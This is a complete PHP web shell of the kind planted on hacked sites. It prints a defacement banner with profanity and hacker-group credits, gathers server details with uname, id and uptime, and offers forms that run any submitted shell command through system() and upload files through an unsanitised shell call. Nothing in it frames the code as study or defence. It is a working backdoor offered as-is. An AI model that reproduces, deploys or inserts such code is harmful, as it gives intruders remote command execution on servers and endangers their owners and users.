<?php

set_magic_quotes_runtime(0);

print "<style>body{font-family:trebuchet ms;font-size:16px;}hr{width:100%;height:2px;}</style>";
print "<center><h1>�Be The Best & Futh The Rest�</h1></center>";
print "<center><h1>( Owned by #BlackPower @Undernet.org - )</h1></center>";
print "<center><h1>(Fuck God Because )</h1></center>";
print "<center><h1>( God help us to Hack You!)</h1></center>";
print "<center><h1> Pwned by unlocker aka W8ting4u </h1></center>";
print "<hr><hr>";

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;
$pwd = `pwd`;
$uptime = `uptime`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

print "<table>";
print "<tr><td><b>Noi Suntem:</b></td><td>".$_SERVER['REMOTE_HOST']." (".$_SERVER['REMOTE_ADDR'].")</td></tr>";
print "<tr><td><b>Serverul Este:</b></td><td>".$_SERVER['SERVER_SIGNATURE']."</td></tr>";
print "<tr><td><b>Sistemul Este:</b></td><td>$UName</td></tr>";
print "<tr><td><b>Directorul Este:</b></td><td>$pwd</td></tr>";
print "<tr><td><b>Uptime:</b></td><td>$uptime</td></tr>";
print "<tr><td><b>Id:</b></td><td>$UserID</td></tr>";
print "</table>";

print "<hr><hr>";

if( $_POST['_act'] == "List files!" ) {
    $currentCMD = "lwp-download";
}

print "<form method=post enctype=\"multipart/form-data\"><table>";

print "<tr><td><b>Execute command:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Execute!\"></td></tr>";

print "<tr><td><b>Change directory:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List files!\"></td></tr>";

print "<tr><td><b>Upload file:</b></td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";

print "</table></form><hr><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "Upload!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Error while uploading file!</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>File uploaded successfully!</b></center>";
    }    
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
    system($currentCMD);
    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Command completed</b></center>";
}

exit;

?>

